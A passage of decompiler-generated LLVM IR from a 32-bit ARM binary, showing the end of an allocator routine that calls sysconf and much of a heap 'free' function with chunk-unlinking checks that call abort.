  %v2_16d40 = inttoptr i32 %v1_16d40 to i32*
  %v3_16d40 = load i32, i32* %v2_16d40, align 4
  store i32 %v3_16d40, i32* @r2, align 4
  %v1_16d44 = or i32 %v0_16d44, 1
  store i32 %v1_16d44, i32* %r3.global-to-local, align 4
  %v0_16d48 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_16d48, i32* %v2_16d40, align 4
  %v0_16d4c = load i32, i32* %r1.global-to-local, align 4
  %v1_16d4c = load i32, i32* @r2, align 4
  %v2_16d4c = add i32 %v1_16d4c, 12
  %v3_16d4c = inttoptr i32 %v2_16d4c to i32*
  store i32 %v0_16d4c, i32* %v3_16d4c, align 4
  %v0_16d50 = load i32, i32* %lr.global-to-local, align 4
  %v1_16d50 = load i32, i32* %r1.global-to-local, align 4
  %v3_16d50 = add i32 %v1_16d50, %v0_16d50
  %v4_16d50 = inttoptr i32 %v3_16d50 to i32*
  store i32 %v0_16d50, i32* %v4_16d50, align 4
  %v0_16d54 = load i32, i32* %r3.global-to-local, align 4
  %v1_16d54 = load i32, i32* %r1.global-to-local, align 4
  %v2_16d54 = add i32 %v1_16d54, 4
  %v3_16d54 = inttoptr i32 %v2_16d54 to i32*
  store i32 %v0_16d54, i32* %v3_16d54, align 4
  %v0_16d58 = load i32, i32* @r2, align 4
  %v1_16d58 = load i32, i32* %r1.global-to-local, align 4
  %v2_16d58 = add i32 %v1_16d58, 8
  %v3_16d58 = inttoptr i32 %v2_16d58 to i32*
  store i32 %v0_16d58, i32* %v3_16d58, align 4
  %v0_16d5c = load i32, i32* %r7.global-to-local, align 4
  %v1_16d5c = load i32, i32* %r1.global-to-local, align 4
  %v2_16d5c = add i32 %v1_16d5c, 12
  %v3_16d5c = inttoptr i32 %v2_16d5c to i32*
  store i32 %v0_16d5c, i32* %v3_16d5c, align 4
  br label %dec_label_pc_16d74

dec_label_pc_16d64:                               ; preds = %dec_label_pc_16cec
  %v2_16d64 = add i32 %v1_16cf4, %v0_16d64
  %v1_16d68 = or i32 %v2_16d64, 1
  store i32 %v1_16d68, i32* %r3.global-to-local, align 4
  %v1_16d6c = load i32, i32* %r1.global-to-local, align 4
  %v2_16d6c = add i32 %v1_16d6c, 4
  %v3_16d6c = inttoptr i32 %v2_16d6c to i32*
  store i32 %v1_16d68, i32* %v3_16d6c, align 4
  %v0_16d70 = load i32, i32* %r1.global-to-local, align 4
  %v1_16d70 = load i32, i32* @r4, align 4
  %v2_16d70 = add i32 %v1_16d70, 44
  %v3_16d70 = inttoptr i32 %v2_16d70 to i32*
  store i32 %v0_16d70, i32* %v3_16d70, align 4
  br label %dec_label_pc_16d74

dec_label_pc_16d74:                               ; preds = %dec_label_pc_16d40, %dec_label_pc_16d64
  %v0_16d74 = load i32, i32* %sl.global-to-local, align 4
  %v2_16d74 = icmp eq i32 %v0_16d74, 0
  store i32 %v0_16d74, i32* %r1.global-to-local, align 4
  br i1 %v2_16d74, label %dec_label_pc_16d80.loopexit, label %dec_label_pc_16c9c

dec_label_pc_16d80.loopexit:                      ; preds = %dec_label_pc_16d74
  %v0_16d80.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_16d80.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_16d80

dec_label_pc_16d80:                               ; preds = %dec_label_pc_16d80.loopexit, %dec_label_pc_16c8c
  %v1_16d80 = phi i32 [ %v1_16d80.pre, %dec_label_pc_16d80.loopexit ], [ %v1_16d8010, %dec_label_pc_16c8c ]
  %v0_16d88 = phi i32 [ %v0_16d80.pre, %dec_label_pc_16d80.loopexit ], [ %v1_16c98, %dec_label_pc_16c8c ]
  %v9_16d80 = icmp eq i32 %v0_16d88, %v1_16d80
  br i1 %v9_16d80, label %dec_label_pc_16df8, label %dec_label_pc_16d88

dec_label_pc_16d88:                               ; preds = %dec_label_pc_16d80
  %v1_16d88 = add i32 %v0_16d88, 4
  store i32 %v1_16d88, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16c8c

dec_label_pc_16d90.dec_label_pc_16d90_crit_edge:  ; preds = %dec_label_pc_16d90.preheader, %dec_label_pc_16d90.dec_label_pc_16d90_crit_edge
  %v0_16d90.pre = load i32, i32* @r4, align 4
  %v1_16d90.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_16d90 = mul i32 %v1_16d90.pre, 8
  %v5_16d90 = add i32 %v4_16d90, %v0_16d90.pre
  %v1_16d94 = add i32 %v1_16d90.pre, 1
  store i32 %v1_16d94, i32* %r2.global-to-local, align 4
  %v1_16d98 = add i32 %v5_16d90, 44
  store i32 %v1_16d98, i32* %r3.global-to-local, align 4
  %v2_16da0 = add i32 %v5_16d90, 52
  %v3_16da0 = inttoptr i32 %v2_16da0 to i32*
  store i32 %v1_16d98, i32* %v3_16da0, align 4
  %v0_16da4 = load i32, i32* %r3.global-to-local, align 4
  %v2_16da4 = add i32 %v0_16da4, 12
  %v3_16da4 = inttoptr i32 %v2_16da4 to i32*
  store i32 %v0_16da4, i32* %v3_16da4, align 4
  %v7_16da8 = icmp sgt i32 %v1_16d94, 95
  br i1 %v7_16da8, label %dec_label_pc_16dac, label %dec_label_pc_16d90.dec_label_pc_16d90_crit_edge

dec_label_pc_16dac:                               ; preds = %dec_label_pc_16d90.dec_label_pc_16d90_crit_edge
  %v0_16dac = load i32, i32* @r4, align 4
  %v1_16dac = inttoptr i32 %v0_16dac to i32*
  %v2_16dac = load i32, i32* %v1_16dac, align 4
  store i32 %v2_16dac, i32* %r2.global-to-local, align 4
  %v1_16db0 = add i32 %v0_16dac, 864
  %v2_16db0 = inttoptr i32 %v1_16db0 to i32*
  %v3_16db0 = load i32, i32* %v2_16db0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_16db8 = urem i32 %v2_16dac, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_16dc0 = or i32 %v3_16db0, 1
  store i32 %v1_16dc0, i32* %r1.global-to-local, align 4
  %v1_16dc4 = or i32 %v1_16db8, 72
  store i32 %v1_16dc4, i32* %r2.global-to-local, align 4
  %v1_16dc8 = add i32 %v0_16dac, 52
  store i32 %v1_16dc8, i32* @ip, align 4
  %v2_16dcc = add i32 %v0_16dac, 840
  %v3_16dcc = inttoptr i32 %v2_16dcc to i32*
  store i32 0, i32* %v3_16dcc, align 4
  %v0_16dd0 = load i32, i32* %r3.global-to-local, align 4
  %v1_16dd0 = add i32 %v0_16dd0, 65536
  store i32 %v1_16dd0, i32* %r3.global-to-local, align 4
  %v0_16dd4 = load i32, i32* %r0.global-to-local, align 4
  %v1_16dd4 = load i32, i32* @r4, align 4
  %v2_16dd4 = add i32 %v1_16dd4, 836
  %v3_16dd4 = inttoptr i32 %v2_16dd4 to i32*
  store i32 %v0_16dd4, i32* %v3_16dd4, align 4
  %v0_16dd8 = load i32, i32* %r0.global-to-local, align 4
  %v1_16dd8 = load i32, i32* @r4, align 4
  %v2_16dd8 = add i32 %v1_16dd8, 844
  %v3_16dd8 = inttoptr i32 %v2_16dd8 to i32*
  store i32 %v0_16dd8, i32* %v3_16dd8, align 4
  %v1_16ddc = load i32, i32* @r4, align 4
  %v2_16ddc = add i32 %v1_16ddc, 852
  %v3_16ddc = inttoptr i32 %v2_16ddc to i32*
  store i32 %v1_16dd0, i32* %v3_16ddc, align 4
  %v1_16de0 = load i32, i32* @r4, align 4
  %v2_16de0 = add i32 %v1_16de0, 864
  %v3_16de0 = inttoptr i32 %v2_16de0 to i32*
  store i32 %v1_16dc0, i32* %v3_16de0, align 4
  %v1_16de4 = load i32, i32* @r4, align 4
  %v2_16de4 = inttoptr i32 %v1_16de4 to i32*
  store i32 %v1_16dc4, i32* %v2_16de4, align 4
  %v0_16de8 = load i32, i32* @ip, align 4
  %v1_16de8 = load i32, i32* @r4, align 4
  %v2_16de8 = add i32 %v1_16de8, 44
  %v3_16de8 = inttoptr i32 %v2_16de8 to i32*
  store i32 %v0_16de8, i32* %v3_16de8, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_16df0 = call i32 @sysconf(i32 30, i32 %v1_16dc0, i32 %v1_16dc4, i32 %v1_16dd0)
  store i32 %v4_16df0, i32* @r0, align 4
  %v1_16df4 = load i32, i32* @r4, align 4
  %v2_16df4 = add i32 %v1_16df4, 860
  %v3_16df4 = inttoptr i32 %v2_16df4 to i32*
  store i32 %v4_16df0, i32* %v3_16df4, align 4
  br label %dec_label_pc_16df8

dec_label_pc_16df8:                               ; preds = %dec_label_pc_16d80, %dec_label_pc_16dac
  %v2_16dfc = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_16dfc, i32* @r4, align 4
  %v1_16e00 = load i32, i32* @r0, align 4
  ret i32 %v1_16e00

; uselistorder directives
  uselistorder i32 %v0_16dac, { 1, 0, 2, 3 }
  uselistorder i32 %v0_16da4, { 1, 0 }
  uselistorder i32 %v1_16d88, { 1, 0 }
  uselistorder i32 %v0_16d74, { 0, 2, 1 }
  uselistorder i32 %v0_16d50, { 1, 0 }
  uselistorder i32 %v1_16ca0, { 1, 0, 2 }
  uselistorder i32 %v0_16cb8, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_16c78, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 1, 19 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 4, 3, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 2, 3, 12 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder i32 860, { 2, 1, 0, 3 }
  uselistorder i32 30, { 0, 6, 1, 2, 5, 3, 4 }
  uselistorder i32 844, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16df8, { 1, 0 }
  uselistorder label %dec_label_pc_16d90.dec_label_pc_16d90_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_16d74, { 1, 0 }
  uselistorder label %dec_label_pc_16d40, { 1, 0 }
  uselistorder label %dec_label_pc_16d34, { 1, 0 }
  uselistorder label %dec_label_pc_16d30, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_16cec, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_16e04 = load i32, i32* @r4, align 4
  %v6_16e04 = load i32, i32* @r5, align 4
  %v9_16e04 = load i32, i32* @r6, align 4
  %v12_16e04 = load i32, i32* @r7, align 4
  %v18_16e04 = load i32, i32* @lr, align 4
  %v0_16e0c = load i32, i32* @r0, align 4
  store i32 %v0_16e0c, i32* @r6, align 4
  %v2_16e0c = icmp eq i32 %v0_16e0c, 0
  %v2_16e10 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* @r7, align 4
  br i1 %v2_16e0c, label %dec_label_pc_17018, label %dec_label_pc_16e1c

dec_label_pc_16e1c:                               ; preds = %entry
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_16e20 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 72) to i32*), align 4
  store i32 %v4_16e20, i32* %r4.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 %v4_16e20, i32* %r2.global-to-local, align 4
  %v4_16e2c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 36) to i32*), align 4
  store i32 %v4_16e2c, i32* %r1.global-to-local, align 4
  store i32 %v2_16e10, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_16e38 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 76) to i32*), align 4
  store i32 %v4_16e38, i32* %ip.global-to-local, align 4
  store i32 93764, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_16e38)
  %v0_16e44 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16e44, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_16e4c = load i32, i32* @r7, align 4
  %v2_16e4c = add i32 %v0_16e4c, 16
  %v3_16e4c = inttoptr i32 %v2_16e4c to i32*
  %v4_16e4c = load i32, i32* %v3_16e4c, align 4
  store i32 %v4_16e4c, i32* %ip.global-to-local, align 4
  store i32 93784, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_16e4c)
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_16e5c = load i32, i32* @r7, align 4
  %v2_16e5c = add i32 %v0_16e5c, 32
  %v3_16e5c = inttoptr i32 %v2_16e5c to i32*
  %v4_16e5c = load i32, i32* %v3_16e5c, align 4
  store i32 %v4_16e5c, i32* @lr, align 4
  %v0_16e60 = load i32, i32* @r6, align 4
  %v1_16e60 = add i32 %v0_16e60, -4
  %v2_16e60 = inttoptr i32 %v1_16e60 to i32*
  %v3_16e60 = load i32, i32* %v2_16e60, align 4
  store i32 %v3_16e60, i32* %r2.global-to-local, align 4
  %v1_16e64 = inttoptr i32 %v4_16e5c to i32*
  %v2_16e64 = load i32, i32* %v1_16e64, align 4
  store i32 %v2_16e64, i32* %r3.global-to-local, align 4
  %v1_16e68 = and i32 %v3_16e60, -4
  store i32 %v1_16e68, i32* %ip.global-to-local, align 4
  %v1_16e6c = add i32 %v0_16e60, -8
  store i32 %v1_16e6c, i32* @r5, align 4
  store i32 %v1_16e6c, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_16e68, %v2_16e64
  br i1 %tmp, label %dec_label_pc_16e9c, label %dec_label_pc_16e7c

dec_label_pc_16e7c:                               ; preds = %dec_label_pc_16e1c
  %v1_16e7c = or i32 %v2_16e64, 3
  store i32 %v1_16e7c, i32* %r3.global-to-local, align 4
  store i32 %v1_16e7c, i32* %v1_16e64, align 4
  %v3_16e80 = load i32, i32* @lr, align 4
  %v4_16e80 = add i32 %v3_16e80, -8
  store i32 %v4_16e80, i32* %lr.global-to-local, align 4
  %v0_16e84 = load i32, i32* %ip.global-to-local, align 4
  %v3_16e84 = udiv i32 %v0_16e84, 8
  store i32 %v3_16e84, i32* %r1.global-to-local, align 4
  %v1_16e88 = add i32 %v3_16e80, -4
  store i32 %v1_16e88, i32* %r2.global-to-local, align 4
  %v4_16e8c = mul nuw i32 %v3_16e84, 4
  %v5_16e8c = add i32 %v4_16e8c, %v1_16e88
  %v6_16e8c = inttoptr i32 %v5_16e8c to i32*
  %v7_16e8c = load i32, i32* %v6_16e8c, align 4
  store i32 %v7_16e8c, i32* %r3.global-to-local, align 4
  %v1_16e90 = load i32, i32* @r5, align 4
  %v2_16e90 = add i32 %v1_16e90, 8
  %v3_16e90 = inttoptr i32 %v2_16e90 to i32*
  store i32 %v7_16e8c, i32* %v3_16e90, align 4
  %v0_16e94 = load i32, i32* @r5, align 4
  %v1_16e94 = load i32, i32* %r2.global-to-local, align 4
  %v2_16e94 = load i32, i32* %r1.global-to-local, align 4
  %v5_16e94 = mul i32 %v2_16e94, 4
  %v6_16e94 = add i32 %v5_16e94, %v1_16e94
  %v7_16e94 = inttoptr i32 %v6_16e94 to i32*
  store i32 %v0_16e94, i32* %v7_16e94, align 4
  br label %dec_label_pc_17000

dec_label_pc_16e9c:                               ; preds = %dec_label_pc_16e1c
  %v1_16e9c = and i32 %v3_16e60, 2
  %v2_16e9c = icmp eq i32 %v1_16e9c, 0
  br i1 %v2_16e9c, label %dec_label_pc_16ea4, label %dec_label_pc_16fd8

dec_label_pc_16ea4:                               ; preds = %dec_label_pc_16e9c
  %v1_16ea4 = or i32 %v2_16e64, 1
  store i32 %v1_16ea4, i32* %r3.global-to-local, align 4
  store i32 %v1_16ea4, i32* %v1_16e64, align 4
  %v0_16eac = load i32, i32* @r6, align 4
  %v1_16eac = add i32 %v0_16eac, -4
  %v2_16eac = inttoptr i32 %v1_16eac to i32*
  %v3_16eac = load i32, i32* %v2_16eac, align 4
  store i32 %v3_16eac, i32* %r3.global-to-local, align 4
  %v0_16eb0 = load i32, i32* @r5, align 4
  %v1_16eb0 = load i32, i32* %ip.global-to-local, align 4
  %v2_16eb0 = add i32 %v1_16eb0, %v0_16eb0
  store i32 %v2_16eb0, i32* %lr.global-to-local, align 4
  %v1_16eb4 = urem i32 %v3_16eac, 2
  %v2_16eb4 = icmp eq i32 %v1_16eb4, 0
  %v1_16eb8 = add i32 %v2_16eb0, 4
  %v2_16eb8 = inttoptr i32 %v1_16eb8 to i32*
  %v3_16eb8 = load i32, i32* %v2_16eb8, align 4
  store i32 %v3_16eb8, i32* %r8.global-to-local, align 4
  br i1 %v2_16eb4, label %dec_label_pc_16ec0, label %dec_label_pc_16ef4

dec_label_pc_16ec0:                               ; preds = %dec_label_pc_16ea4
  %v1_16ec0 = add i32 %v0_16eac, -8
  %v2_16ec0 = inttoptr i32 %v1_16ec0 to i32*
  %v3_16ec0 = load i32, i32* %v2_16ec0, align 4
  store i32 %v3_16ec0, i32* %r1.global-to-local, align 4
  %v2_16ec4 = sub i32 %v0_16eb0, %v3_16ec0
  store i32 %v2_16ec4, i32* %r3.global-to-local, align 4
  %v1_16ec8 = add i32 %v2_16ec4, 8
  %v2_16ec8 = inttoptr i32 %v1_16ec8 to i32*
  %v3_16ec8 = load i32, i32* %v2_16ec8, align 4
  store i32 %v3_16ec8, i32* %r2.global-to-local, align 4
  %v1_16ecc = add i32 %v3_16ec8, 12
  %v2_16ecc = inttoptr i32 %v1_16ecc to i32*
  %v3_16ecc = load i32, i32* %v2_16ecc, align 4
  store i32 %v3_16ecc, i32* %r4.global-to-local, align 4
  %v9_16ed0 = icmp eq i32 %v3_16ecc, %v2_16ec4
  %v1_16ed4 = add i32 %v2_16ec4, 12
  %v2_16ed4 = inttoptr i32 %v1_16ed4 to i32*
  %v3_16ed4 = load i32, i32* %v2_16ed4, align 4
  store i32 %v3_16ed4, i32* %r0.global-to-local, align 4
  br i1 %v9_16ed0, label %dec_label_pc_16edc, label %dec_label_pc_16f40

dec_label_pc_16edc:                               ; preds = %dec_label_pc_16ec0
  %v1_16edc = add i32 %v3_16ed4, 8
  %v2_16edc = inttoptr i32 %v1_16edc to i32*
  %v3_16edc = load i32, i32* %v2_16edc, align 4
  store i32 %v3_16edc, i32* %r3.global-to-local, align 4
  %v9_16ee0 = icmp eq i32 %v3_16edc, %v2_16ec4
  br i1 %v9_16ee0, label %dec_label_pc_16ee8, label %dec_label_pc_16f40

dec_label_pc_16ee8:                               ; preds = %dec_label_pc_16edc
  store i32 %v3_16ec8, i32* %v2_16edc, align 4
  %v0_16eec = load i32, i32* %r0.global-to-local, align 4
  %v1_16eec = load i32, i32* %r2.global-to-local, align 4
  %v2_16eec = add i32 %v1_16eec, 12
  %v3_16eec = inttoptr i32 %v2_16eec to i32*
  store i32 %v0_16eec, i32* %v3_16eec, align 4
  %v0_16ef0 = load i32, i32* %ip.global-to-local, align 4
  %v1_16ef0 = load i32, i32* %r1.global-to-local, align 4
  %v2_16ef0 = add i32 %v1_16ef0, %v0_16ef0
  store i32 %v2_16ef0, i32* %ip.global-to-local, align 4
  %v0_16f00.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_16f04.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_16ef4

dec_label_pc_16ef4:                               ; preds = %dec_label_pc_16ea4, %dec_label_pc_16ee8
  %v0_16f80 = phi i32 [ %v1_16eb0, %dec_label_pc_16ea4 ], [ %v2_16ef0, %dec_label_pc_16ee8 ]
  %v0_16f04 = phi i32 [ %v3_16eb8, %dec_label_pc_16ea4 ], [ %v0_16f04.pre, %dec_label_pc_16ee8 ]
  %v1_16f18 = phi i32 [ %v2_16eb0, %dec_label_pc_16ea4 ], [ %v0_16f00.pre, %dec_label_pc_16ee8 ]
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_16ef8 = load i32, i32* @r7, align 4
  %v2_16ef8 = add i32 %v0_16ef8, 32
  %v3_16ef8 = inttoptr i32 %v2_16ef8 to i32*
  %v4_16ef8 = load i32, i32* %v3_16ef8, align 4
  store i32 %v4_16ef8, i32* %r2.global-to-local, align 4
  %v1_16efc = add i32 %v4_16ef8, 44
  %v2_16efc = inttoptr i32 %v1_16efc to i32*
  %v3_16efc = load i32, i32* %v2_16efc, align 4
  store i32 %v3_16efc, i32* %r3.global-to-local, align 4
  %v9_16f00 = icmp eq i32 %v1_16f18, %v3_16efc
  %v1_16f04 = and i32 %v0_16f04, -4
  store i32 %v1_16f04, i32* %r0.global-to-local, align 4
  br i1 %v9_16f00, label %dec_label_pc_16f80, label %dec_label_pc_16f0c

dec_label_pc_16f0c:                               ; preds = %dec_label_pc_16ef4
  %v2_16f0c = add i32 %v1_16f18, %v1_16f04
  store i32 %v2_16f0c, i32* %r3.global-to-local, align 4
  %v1_16f10 = add i32 %v2_16f0c, 4
  %v2_16f10 = inttoptr i32 %v1_16f10 to i32*
  %v3_16f10 = load i32, i32* %v2_16f10, align 4
  store i32 %v3_16f10, i32* %r3.global-to-local, align 4
  %v1_16f14 = urem i32 %v3_16f10, 2
  %v2_16f14 = icmp eq i32 %v1_16f14, 0
  %v2_16f18 = add i32 %v1_16f18, 4
  %v3_16f18 = inttoptr i32 %v2_16f18 to i32*
  store i32 %v1_16f04, i32* %v3_16f18, align 4
  br i1 %v2_16f14, label %dec_label_pc_16f20, label %dec_label_pc_16f0c.dec_label_pc_16f50_crit_edge

dec_label_pc_16f0c.dec_label_pc_16f50_crit_edge:  ; preds = %dec_label_pc_16f0c
  %v0_16f60.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_16f50

dec_label_pc_16f20:                               ; preds = %dec_label_pc_16f0c
  %v0_16f20 = load i32, i32* %lr.global-to-local, align 4
  %v1_16f20 = add i32 %v0_16f20, 8
  %v2_16f20 = inttoptr i32 %v1_16f20 to i32*
  %v3_16f20 = load i32, i32* %v2_16f20, align 4
  store i32 %v3_16f20, i32* %r1.global-to-local, align 4
  %v1_16f24 = add i32 %v3_16f20, 12
  %v2_16f24 = inttoptr i32 %v1_16f24 to i32*
  %v3_16f24 = load i32, i32* %v2_16f24, align 4
  store i32 %v3_16f24, i32* %r3.global-to-local, align 4
  %v9_16f28 = icmp eq i32 %v3_16f24, %v0_16f20
  %v1_16f2c = add i32 %v0_16f20, 12
  %v2_16f2c = inttoptr i32 %v1_16f2c to i32*
  %v3_16f2c = load i32, i32* %v2_16f2c, align 4
  store i32 %v3_16f2c, i32* %r2.global-to-local, align 4
  br i1 %v9_16f28, label %dec_label_pc_16f34, label %dec_label_pc_16f40

dec_label_pc_16f34:                               ; preds = %dec_label_pc_16f20
  %v1_16f34 = add i32 %v3_16f2c, 8
  %v2_16f34 = inttoptr i32 %v1_16f34 to i32*
  %v3_16f34 = load i32, i32* %v2_16f34, align 4
  store i32 %v3_16f34, i32* %r3.global-to-local, align 4
  %v9_16f38 = icmp eq i32 %v3_16f34, %v0_16f20
  br i1 %v9_16f38, label %dec_label_pc_16f44, label %dec_label_pc_16f40

dec_label_pc_16f40:                               ; preds = %dec_label_pc_16f20, %dec_label_pc_16edc, %dec_label_pc_16ec0, %dec_label_pc_16f34
  %v0_16f40 = call i32 @abort()
  store i32 %v0_16f40, i32* %r0.global-to-local, align 4
  %v0_16f44.pre = load i32, i32* @r1, align 4
  %v1_16f44.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_16f44

dec_label_pc_16f44:                               ; preds = %dec_label_pc_16f34, %dec_label_pc_16f40
  %v1_16f44 = phi i32 [ %v3_16f2c, %dec_label_pc_16f34 ], [ %v1_16f44.pre, %dec_label_pc_16f40 ]
  %v0_16f44 = phi i32 [ %v3_16f20, %dec_label_pc_16f34 ], [ %v0_16f44.pre, %dec_label_pc_16f40 ]
  %v2_16f44 = add i32 %v1_16f44, 8
  %v3_16f44 = inttoptr i32 %v2_16f44 to i32*
  store i32 %v0_16f44, i32* %v3_16f44, align 4
  %v0_16f48 = load i32, i32* %r2.global-to-local, align 4
  %v1_16f48 = load i32, i32* %r1.global-to-local, align 4
  %v2_16f48 = add i32 %v1_16f48, 12
  %v3_16f48 = inttoptr i32 %v2_16f48 to i32*
  store i32 %v0_16f48, i32* %v3_16f48, align 4
  %v0_16f4c = load i32, i32* %ip.global-to-local, align 4
  %v1_16f4c = load i32, i32* %r0.global-to-local, align 4
  %v2_16f4c = add i32 %v1_16f4c, %v0_16f4c
  store i32 %v2_16f4c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_16f50

dec_label_pc_16f50:                               ; preds = %dec_label_pc_16f0c.dec_label_pc_16f50_crit_edge, %dec_label_pc_16f44
  %v0_16f60 = phi i32 [ %v0_16f60.pre, %dec_label_pc_16f0c.dec_label_pc_16f50_crit_edge ], [ %v2_16f4c, %dec_label_pc_16f44 ]
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_16f54 = load i32, i32* @r7, align 4
  %v2_16f54 = add i32 %v0_16f54, 32
  %v3_16f54 = inttoptr i32 %v2_16f54 to i32*
  %v4_16f54 = load i32, i32* %v3_16f54, align 4
  %v1_16f58 = add i32 %v4_16f54, 52
  store i32 %v1_16f58, i32* %r3.global-to-local, align 4
  %v1_16f5c = add i32 %v4_16f54, 60
  %v2_16f5c = inttoptr i32 %v1_16f5c to i32*
  %v3_16f5c = load i32, i32* %v2_16f5c, align 4
  store i32 %v3_16f5c, i32* %r1.global-to-local, align 4
  %v1_16f60 = or i32 %v0_16f60, 1
  store i32 %v1_16f60, i32* %r2.global-to-local, align 4
  %v1_16f64 = load i32, i32* %r4.global-to-local, align 4
  %v2_16f64 = add i32 %v1_16f64, 12
  %v3_16f64 = inttoptr i32 %v2_16f64 to i32*
  store i32 %v1_16f58, i32* %v3_16f64, align 4
  %v0_16f68 = load i32, i32* %r1.global-to-local, align 4
  %v1_16f68 = load i32, i32* %r4.global-to-local, align 4
  %v2_16f68 = add i32 %v1_16f68, 8
  %v3_16f68 = inttoptr i32 %v2_16f68 to i32*
  store i32 %v0_16f68, i32* %v3_16f68, align 4
  %v0_16f6c = load i32, i32* %r2.global-to-local, align 4
  %v1_16f6c = load i32, i32* %r4.global-to-local, align 4
  %v2_16f6c = add i32 %v1_16f6c, 4
  %v3_16f6c = inttoptr i32 %v2_16f6c to i32*
  store i32 %v0_16f6c, i32* %v3_16f6c, align 4
  %v0_16f70 = load i32, i32* %ip.global-to-local, align 4
  %v1_16f70 = load i32, i32* %r4.global-to-local, align 4
  %v3_16f70 = add i32 %v1_16f70, %v0_16f70
  %v4_16f70 = inttoptr i32 %v3_16f70 to i32*
  store i32 %v0_16f70, i32* %v4_16f70, align 4
  %v0_16f74 = load i32, i32* %r4.global-to-local, align 4
  %v1_16f74 = load i32, i32* %r1.global-to-local, align 4
  %v2_16f74 = add i32 %v1_16f74, 12
  %v3_16f74 = inttoptr i32 %v2_16f74 to i32*
  store i32 %v0_16f74, i32* %v3_16f74, align 4
  %v0_16f78 = load i32, i32* %r4.global-to-local, align 4
  %v1_16f78 = load i32, i32* %r3.global-to-local, align 4
  %v2_16f78 = add i32 %v1_16f78, 8
  %v3_16f78 = inttoptr i32 %v2_16f78 to i32*
  store i32 %v0_16f78, i32* %v3_16f78, align 4
  br label %dec_label_pc_16f90

dec_label_pc_16f80:                               ; preds = %dec_label_pc_16ef4
  %v2_16f80 = add i32 %v1_16f04, %v0_16f80
  store i32 %v2_16f80, i32* %ip.global-to-local, align 4
  %v1_16f84 = or i32 %v2_16f80, 1
  store i32 %v1_16f84, i32* %r3.global-to-local, align 4
  %v0_16f88 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16f88, i32* %v2_16efc, align 4
  %v0_16f8c = load i32, i32* %r3.global-to-local, align 4
  %v1_16f8c = load i32, i32* %r4.global-to-local, align 4
  %v2_16f8c = add i32 %v1_16f8c, 4
  %v3_16f8c = inttoptr i32 %v2_16f8c to i32*
  store i32 %v0_16f8c, i32* %v3_16f8c, align 4
  br label %dec_label_pc_16f90

dec_label_pc_16f90:                               ; preds = %dec_label_pc_16f50, %dec_label_pc_16f80
  %v0_16f90 = load i32, i32* %ip.global-to-local, align 4
  %v3_16f94 = icmp ult i32 %v0_16f90, 131070
  br i1 %v3_16f94, label %dec_label_pc_17000, label %dec_label_pc_16f98

dec_label_pc_16f98:                               ; preds = %dec_label_pc_16f90
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_16f9c = load i32, i32* @r7, align 4
  %v2_16f9c = add i32 %v0_16f9c, 32
  %v3_16f9c = inttoptr i32 %v2_16f9c to i32*
  %v4_16f9c = load i32, i32* %v3_16f9c, align 4
  store i32 %v4_16f9c, i32* @r4, align 4
  %v1_16fa0 = inttoptr i32 %v4_16f9c to i32*
  %v2_16fa0 = load i32, i32* %v1_16fa0, align 4
  store i32 %v2_16fa0, i32* %r3.global-to-local, align 4
  %v1_16fa4 = and i32 %v2_16fa0, 2
  %v2_16fa4 = icmp eq i32 %v1_16fa4, 0
  br i1 %v2_16fa4, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_16f98
  store i32 %v4_16f9c, i32* %r0.global-to-local, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_16f98, %bb
  %v1_16fac = xor i1 %v2_16fa4, true
